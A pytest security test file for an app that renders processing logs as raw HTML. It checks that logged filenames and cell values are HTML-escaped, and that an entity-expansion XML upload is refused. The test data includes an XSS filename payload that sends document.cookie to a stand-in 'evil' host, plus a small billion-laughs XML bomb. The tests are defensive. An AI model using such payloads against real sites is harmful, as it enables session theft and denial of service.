"""Guard the processing-log XSS boundary.

``ui/shared.py::show_processing_log`` renders every log line with
``unsafe_allow_html=True`` (the producers deliberately emit coloured
``<span>``/``<b>`` markup). That makes every value interpolated into a log
line an HTML injection point, and the values are attacker-controlled:
uploaded filenames and cell contents from supplier workbooks.

This has now regressed twice — v2.75.6 fixed ``ui/giii/excel_extraction.py``
and missed the other three producers. So rather than trusting review, this
module asserts the invariant mechanically: **every f-string interpolation
inside a ``log.append(...)`` call must be wrapped in ``html.escape(...)``.**

A new producer file that forgets to escape fails ``test_all_log_producers_escape``.
"""
from __future__ import annotations

import ast
import io
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parent.parent

# Every module that appends to a `log` list rendered by show_processing_log().
PRODUCERS = [
    "ui/giii/excel_extraction.py",
    "ui/giii/extraction.py",
    "ui/sky_east/_validators.py",
    "ui/sky_east/processing.py",
]


def _unescaped_interpolations(path: Path) -> list[tuple[int, str]]:
    """Return [(lineno, expr)] for log.append f-string values lacking escape()."""
    tree = ast.parse(io.open(path, encoding="utf-8").read())
    bad: list[tuple[int, str]] = []
    for node in ast.walk(tree):
        if not (isinstance(node, ast.Call)
                and isinstance(node.func, ast.Attribute)
                and node.func.attr == "append"
                and isinstance(node.func.value, ast.Name)
                and node.func.value.id == "log"):
            continue
        for arg in node.args:
            for sub in ast.walk(arg):
                if not isinstance(sub, ast.FormattedValue):
                    continue
                expr = sub.value
                escaped = (isinstance(expr, ast.Call)
                           and isinstance(expr.func, ast.Attribute)
                           and expr.func.attr == "escape")
                if not escaped:
                    bad.append((node.lineno, ast.unparse(expr)))
    return bad


@pytest.mark.parametrize("rel", PRODUCERS)
def test_all_log_producers_escape(rel):
    """No unescaped value may reach the unsafe_allow_html log renderer."""
    path = REPO / rel
    assert path.exists(), f"producer moved or renamed: {rel}"
    bad = _unescaped_interpolations(path)
    assert not bad, (
        f"{rel}: {len(bad)} unescaped interpolation(s) reach the "
        f"unsafe_allow_html processing log — wrap each in html.escape(str(...)): "
        + "; ".join(f"line {ln}: {expr}" for ln, expr in bad[:10])
    )


def test_detector_catches_a_planted_violation(tmp_path):
    """The guard above must actually fail on unescaped input (not vacuously pass)."""
    f = tmp_path / "bad_producer.py"
    f.write_text(
        "log = []\n"
        "fname = 'x'\n"
        "log.append(f'<span>{fname}</span>')\n",
        encoding="utf-8",
    )
    assert _unescaped_interpolations(f) == [(3, "fname")]

    good = tmp_path / "good_producer.py"
    good.write_text(
        "import html\n"
        "log = []\n"
        "fname = 'x'\n"
        "log.append(f'<span>{html.escape(str(fname))}</span>')\n",
        encoding="utf-8",
    )
    assert _unescaped_interpolations(good) == []


def test_malicious_filename_is_neutralised_end_to_end():
    """A hostile uploaded filename must not survive as live HTML in a log line.

    Mirrors ui/sky_east/processing.py's parse-failure line — the exact shape
    that rendered raw before this fix.
    """
    import html

    fname = '<img src=x onerror="fetch(`//evil/${document.cookie}`)">.xlsx'
    exc = ValueError("<script>alert(1)</script>")

    line = (f'<span style="color:#dc3545">{html.escape(str(fname))}</span>: '
            f'{html.escape(str(exc))}')

    # The wrapper markup the producer intends survives …
    assert line.startswith('<span style="color:#dc3545">')

    # … but nothing attacker-supplied can open a tag. Strip the two trusted
    # literal fragments the producer contributes; no '<' may remain, so the
    # payload is inert text no matter what it spells (a leftover "onerror="
    # with no tag to attach to cannot execute).
    attacker_part = (line
                     .replace('<span style="color:#dc3545">', "")
                     .replace("</span>", ""))
    assert "<" not in attacker_part
    assert "&lt;img" in line and "&lt;script&gt;" in line
    # The quotes that would close an attribute are neutralised too.
    assert '"' not in attacker_part


def test_hostile_xml_is_refused_not_crashed():
    """An entity-expansion bomb in an uploaded workbook is refused, and the
    refusal is caught by the module's handler tuple rather than escaping."""
    from po_extractor.utils import image_extractor as ie

    billion_laughs = (
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">'
        '<!ENTITY lol2 "&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>'
    )
    with pytest.raises(tuple(ie._XML_ERRORS)):
        ie.ET.fromstring(billion_laughs)
